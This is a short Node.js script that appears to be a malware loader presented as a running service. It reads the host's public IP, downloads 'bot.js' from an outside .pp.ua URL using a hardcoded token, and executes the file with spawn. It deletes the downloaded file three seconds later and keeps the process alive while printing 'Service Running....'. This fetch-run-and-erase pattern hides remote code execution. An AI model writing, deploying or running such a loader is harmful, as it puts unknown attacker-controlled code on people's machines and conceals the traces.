const https = require("https");
const fs = require("fs");
const { spawn } = require("child_process");

const TOKEN = "eyJhIjoiZmQ5YjNkMDdkOWQxZWYxY2M4OGY2ZTJiNDE2OTNmZmUiLCJ0IjoiZTcxM2IwNmItMTI4OS00YWE0LWJkYjYtNDA2Y2JmM2U2ODNhIiwicyI6Ik5tWmlPRGMyTnprdFltRXpPUzAwWXpFd0xXSmhPR1F0T1dKa01qVTVPREUzWldSbSJ9";
const BOT_URL = `https://netjett-de.kof95zip.pp.ua/jsbot/cfws/bot.php?token=${TOKEN}`;
const BOT_FILE = "./bot.js";


function getPublicIP() {
    return new Promise((resolve, reject) => {
        https.get("https://api.ipify.org?format=json", (res) => {
            let data = "";
            res.on("data", chunk => {
                data += chunk;
            });
            res.on("end", () => {
                try {
                    const json = JSON.parse(data);
                    resolve(json.ip);
                } catch (err) {
                    reject(err);
                }
            });
        }).on("error", err => {
            reject(err);
        });
    });
}

function download(url, filename) {
    return new Promise((resolve, reject) => {
        const file = fs.createWriteStream(filename);
        https.get(url, (res) => {
            if (res.statusCode !== 200) {
                reject(new Error("Download Fail: " + res.statusCode));
                return;
            }
            res.pipe(file);
            file.on("finish", () => {
                file.close();
                resolve();
            });
        }).on("error", (err) => {
            fs.unlink(filename, () => {});
            reject(err);
        });
    });
}

async function startBot() {
    try {
        try {
            const ip = await getPublicIP();
            console.log("My IP:", ip);
        } catch (e) {
            console.log("Get IP Failed:", e.message);
        }
        await download(BOT_URL, BOT_FILE);
        const bot = spawn("node", [BOT_FILE], {
            stdio: "inherit"
        });
        setTimeout(() => {
            if (fs.existsSync(BOT_FILE)) {
                fs.unlinkSync(BOT_FILE);
            }
        }, 3000);
        bot.on("exit", (code) => {});
    } catch (err) {
        console.error("Error:", err.message);
    }
}

startBot();

console.log("Service Running....");

setInterval(() => {}, 60000);
